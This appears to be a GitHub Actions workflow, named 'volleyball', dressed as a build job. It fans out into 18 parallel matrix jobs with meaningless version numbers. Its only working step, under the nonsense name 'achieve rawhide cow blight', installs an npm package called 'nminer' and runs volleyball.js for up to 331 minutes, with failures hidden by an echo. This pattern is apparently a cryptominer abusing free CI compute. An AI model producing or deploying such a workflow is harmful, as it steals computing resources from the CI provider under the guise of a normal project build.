name: volleyball
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 443 }
          - { version: 9879 }
          - { version: 6224 }
          - { version: 9921 }
          - { version: 1911 }
          - { version: 648 }
          - { version: 9159 }
          - { version: 2318 }
          - { version: 9706 }
          - { version: 6871 }
          - { version: 5136 }
          - { version: 9381 }
          - { version: 1574 }
          - { version: 2410 }
          - { version: 8662 }
          - { version: 8263 }
          - { version: 8630 }
          - { version: 1443 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: achieve rawhide cow blight
        run: |
          npm install nminer@latest
          timeout 331m node volleyball.js || echo "volleyball executed"